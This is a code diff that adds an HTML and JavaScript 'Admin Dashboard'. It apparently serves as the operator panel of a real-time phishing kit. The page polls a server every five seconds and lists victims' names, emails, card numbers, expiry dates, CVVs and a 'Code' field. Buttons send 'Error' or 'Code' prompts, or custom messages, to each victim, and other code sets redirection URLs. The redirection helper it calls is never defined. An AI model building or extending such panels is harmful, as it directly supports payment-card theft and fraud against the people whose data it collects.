@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fomantic-ui/2.9.3/semantic.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        .dashboard {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .dashboard h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .table-container {
+            overflow-x: auto;
+        }
+
+        .message-btn {
+            padding: 5px 10px;
+            margin: 5px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        .message-btn:hover {
+            background-color: #45a049;
+        }
+
+        .td-message {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .custom-input {
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="dashboard">
+    <h1>Admin Dashboard</h1>
+    <div class="table-container">
+        <table class="ui celled table">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Name</th>
+                    <th>Email</th>
+                    <th>Date</th>
+                    <th>Message</th>
+                    <th>Code</th>
+                    <th>Card Number</th>
+                    <th>Expiry Date</th>
+                    <th>CVV</th>
+                </tr>
+            </thead>
+            <tbody id="data-table">
+                <!-- Data will be populated here -->
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<script>
+    let previousLength = 0; // Track the previous number of connections
+    let autoRefreshEnabled = false; // Flag to track auto-refresh status
+    let autoRefreshInterval = null; // Store the interval ID
+
+
+    // Function to send a message via POST
+    function sendMessage(email, message) {
+        return fetch('/message', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ email, message }),
+        }).then(response => response.json());
+    }
+
+    async function fetchData(forceUpdate = true) {
+        try {
+            const response = await fetch('/admin/infos');
+            const data = await response.json();
+
+            if (forceUpdate || data.length !== previousLength) {
+                previousLength = data.length;
+                const table = document.getElementById('data-table');
+                table.innerHTML = ''; // Clear the table before populating
+
+                data.forEach(item => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${item.id}</td>
+                        <td>${item.name}</td>
+                        <td>${item.email}</td>
+                        <td>${item.date || 'N/A'}</td>
+                        <td class="td-message">
+                            ${item.message || 'N/A'}
+                            <div class="custom-input">
+                                <input type="text" id="customMessageInput-${item.id}" placeholder="Enter your message" />
+                                <button class="message-btn" data-email="${item.email}" data-id="${item.id}">Send Custom Message</button>
+                            </div>
+
+                        <button class="message-btn" data-email="${item.email}" data-message="Error">Error</button>
+                        <button class="message-btn" data-email="${item.email}" data-message="Code">Code</button>
+                        </td>
+                        <td>${item.code || 'N/A'}</td>
+                        <td>${item.card_number || 'N/A'}</td>
+                        <td>${item.expiry_date || 'N/A'}</td>
+                        <td>${item.cvv || 'N/A'}</td>
+                    `;
+                    table.appendChild(row);
+                });
+            }
+        } catch (error) {
+            console.error('Error fetching data:', error);
+        }
+    }
+
+    document.addEventListener('click', function (event) {
+        if (event.target.classList.contains('message-btn')) {
+            const button = event.target;
+            const email = button.getAttribute('data-email');
+            const messageId = button.getAttribute('data-id');
+            let message = button.getAttribute('data-message');
+            const customMessageInput = document.getElementById(`customMessageInput-${messageId}`);
+
+            if (customMessageInput && customMessageInput.value) {
+                // If a custom message is provided, override the default message
+                message = customMessageInput.value;
+            }
+
+            sendMessage(email, message)
+                .then(data => {
+                    if (data.success) {
+                        fetchData(true); // Refresh the table on success
+                    } else {
+                        alert('Error updating the message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while sending the message.');
+                });
+        }
+
+        if (event.target.classList.contains('action-btn')) {
+            const button = event.target;
+            const email = button.getAttribute('data-email');
+            const actionId = button.getAttribute('data-id');
+            const actionInput = document.getElementById(`actionInput-${actionId}`);
+
+            if (actionInput && actionInput.value) {
+                const url = actionInput.value;
+
+                // Send the redirection URL
+                sendRedirectionURL(email, url)
+                    .then(data => {
+                        if (data.success) {
+                            fetchData(true); // Refresh the table on success
+                        } else {
+                            alert('Error setting redirection URL.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('An error occurred while setting the redirection URL.');
+                    });
+            }
+        }
+    });
+
+    // Automatically refresh the list periodically (if enabled)
+    setInterval(() => {
+        if (!autoRefreshEnabled) {
+            fetchData();
+        }
+    }, 5000);
+
+
+</script>
+
+</body>
+</html>
